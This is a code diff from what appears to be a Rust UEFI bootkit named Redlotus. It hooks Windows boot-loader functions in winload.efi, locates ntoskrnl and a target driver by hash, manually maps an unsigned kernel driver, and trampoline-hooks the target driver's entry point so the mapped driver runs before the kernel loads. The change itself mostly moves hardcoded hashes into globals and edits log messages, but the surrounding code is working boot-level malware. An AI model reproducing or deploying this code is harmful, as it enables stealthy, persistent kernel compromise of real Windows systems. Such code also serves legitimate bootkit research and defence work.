@@ -4,7 +4,7 @@ use core::{slice::from_raw_parts};
 use uefi::{prelude::BootServices};
 use uefi::proto::loaded_image::LoadedImage;
 use uefi::{Handle, Status};
-use crate::boot::globals::{ALLOCATED_BUFFER, DRIVER_IMAGE_SIZE};
+use crate::boot::globals::{ALLOCATED_BUFFER, DRIVER_IMAGE_SIZE, TARGET_DRIVER_HASH, NTOSKRNL_HASH};
 use crate::boot::pe::{pattern_scan, trampoline_hook64, trampoline_unhook, get_loaded_module_by_hash};
 use crate::mapper::{manually_map};
 use super::globals::JMP_SIZE;
@@ -84,7 +84,7 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
     // Unhook ImgArchStartBootApplication and restore stolen bytes before we do anything else
     unsafe { trampoline_unhook(ImgArchStartBootApplication.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES.as_mut_ptr(), JMP_SIZE) };
 
-    log::info!("[+] ImgArchStartBootApplication Hook called!");
+    log::info!("[*] ImgArchStartBootApplication Hook called!\n\n");
 
     // Read the data Windows OS Loader (winload.efi) from memory and store in a slice
     let winload_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };
@@ -126,7 +126,7 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
             .expect("Failed to perform trampoline hook on BlImgAllocateImageBuffer");
     }
 
-    log::info!("[+] Calling Original ImgArchStartBootApplication");
+    log::info!("[+] Calling Original ImgArchStartBootApplication \n\n");
 
     // Call the original unhooked ImgArchStartBootApplication function
     return unsafe { ImgArchStartBootApplication.unwrap()(_app_entry, image_base, image_size, _boot_option, _return_arguments) };
@@ -164,28 +164,26 @@ fn bl_img_allocate_image_buffer_hook(image_buffer: *mut *mut c_void, image_size:
 /// This is called by the Windows OS loader (winload.efi) with _LOADER_PARAMETER_BLOCK before calling ExitBootService (winload.efi context)
 fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) -> uefi::Status {
     // Unhook OslFwpKernelSetupPhase1 and restore stolen bytes before we do anything else
-    unsafe { trampoline_unhook(OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES.as_mut_ptr(),JMP_SIZE) };
+    unsafe { trampoline_unhook(OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8, ORIGINAL_BYTES.as_mut_ptr(), JMP_SIZE) };
 
-    log::info!("[+] OslFwpKernelSetupPhase1 Hook called!");
+    log::info!("[*] OslFwpKernelSetupPhase1 Hook called!\n\n");
 
     // ntoskrnl.exe hash: 0xa3ad0390
     // Get ntoskrnl.exe _LIST_ENTRY from the _LOADER_PARAMETER_BLOCK to get image base and image size 
-    let ntoskrnl_module = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead,0xa3ad0390)
+    let ntoskrnl_module = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead, NTOSKRNL_HASH)
         .expect("Failed to get ntoskrnl by hash")
     };
 
     log::info!("[+] ntoskrnl.exe image base: {:p}", unsafe { (*ntoskrnl_module).DllBase });
     log::info!("[+] ntoskrnl.exe image size: {:#x}", unsafe { (*ntoskrnl_module).SizeOfImage });
 
-    // The target module is the driver we are going to hook, this will be left to the user to change
-    
-    // Disk.sys hash: 0xf78f291d
-    let target_module = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead, 0xf78f291d)
+    // The target module is the driver we are going to hook, this will be left to the user to change    
+    let target_module = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead, TARGET_DRIVER_HASH)
         .expect("Failed to get target driver by hash")
     };
 
-    log::info!("[+] disk.sys image base: {:p}", unsafe { (*target_module).DllBase });
-    log::info!("[+] disk.sys image size: {:#x}", unsafe { (*target_module).SizeOfImage });
+    log::info!("[+] Target Driver image base: {:p}", unsafe { (*target_module).DllBase });
+    log::info!("[+] Target Driver image size: {:#x}", unsafe { (*target_module).SizeOfImage });
 
     let mapped_driver_address_of_entry_point = unsafe { manually_map((*ntoskrnl_module).DllBase as _, (*target_module).EntryPoint as _)
         .expect("Failed to manually map Windows kernel driver")
@@ -197,13 +195,14 @@ fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) 
 
     // Trampoline hook target driver + 7 bytes and redirect to our manually mapped driver
     unsafe { ORIGINAL_BYTES = trampoline_hook64(((*target_module).EntryPoint as *mut u8).add(7), mapped_driver_address_of_entry_point, JMP_SIZE)
-        .expect("Failed to perform trampoline hook on Disk.sys")
+        .expect("Failed to perform trampoline hook on target driver")
     };
 
+    log::info!("[+] Hooked Target Driver Entry");
     log::info!("[+] Redlotus.sys DriverEntry: {:#p}", mapped_driver_address_of_entry_point);
-    log::info!("[+] Disk.sys DriverEntry: {:p}", unsafe { (*target_module).EntryPoint });
-    log::info!("[+] Disk.sys Hook Address: {:#p}", unsafe { ((*target_module).EntryPoint as *mut u8).add(7) });
-    log::info!("[+] Stolen Bytes Address (Only to see what bytes were stolen, freed after kernel loaded): {:#p}", unsafe { ORIGINAL_BYTES.as_mut_ptr() });
+    log::info!("[+] Target Driver DriverEntry: {:p}", unsafe { (*target_module).EntryPoint });
+    log::info!("[+] Target Driver Hook Address: {:#p}", unsafe { ((*target_module).EntryPoint as *mut u8).add(7) });
+    log::info!("[+] Stolen Bytes Address (freed after kernel is loaded): {:#p}", unsafe { ORIGINAL_BYTES.as_mut_ptr() });
 
     log::info!("[+] Loading Windows Kernel...");
 
